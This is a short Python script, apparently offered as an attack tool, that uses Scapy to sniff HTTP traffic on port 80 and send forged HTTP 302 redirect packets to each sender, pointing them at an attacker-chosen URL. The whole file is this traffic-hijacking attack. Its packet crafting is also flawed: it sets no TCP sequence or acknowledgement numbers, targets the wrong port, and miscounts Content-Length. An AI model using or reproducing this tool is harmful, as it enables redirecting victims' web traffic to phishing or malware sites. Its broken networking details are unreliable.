from scapy.all import *
# Written by Lithiokride

# Configuration
target_ip = "10.57.130.66"  # Replace with the target IP
target_port = 80             # Use port 80
redirect_url = "http://example.com/"  # Replace with your redirect URL

def send_redirect(target_ip):
    # Create an HTTP redirect response
    http_redirect_response = (
        "HTTP/1.1 302 Found\r\n"
        f"Location: {redirect_url}\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: {}\r\n".format(len(redirect_url)) +
        "\r\n" +
        f"<html><body><h1>Redirecting to {redirect_url}</h1></body></html>"
    )

    # Create the TCP packet with the HTTP redirect response
    packet = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags='PA') / Raw(load=http_redirect_response)

    # Send the packet
    send(packet)
    print(f"Sent redirect response to {target_ip}")

def redirect_http(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        # Check for HTTP traffic (port 80)
        if packet["TCP"].dport == 80:
            print(f"Intercepted HTTP packet from {packet[IP].src}")
            send_redirect(packet[IP].src)  # Redirect the source IP

def start_sniffing(interface):
    sniff(iface=interface, filter="tcp port 80", prn=redirect_http)

if __name__ == "__main__":
    interface = r"\Device\NPF_{58C5B6B0-AB6B-48B3-8319-44F9DAC9CDB5}"  # Change to your network interface
    try:
        print("Starting to listen for HTTP traffic...")
        start_sniffing(interface)
    except KeyboardInterrupt:
        print("Stopping packet listening.")
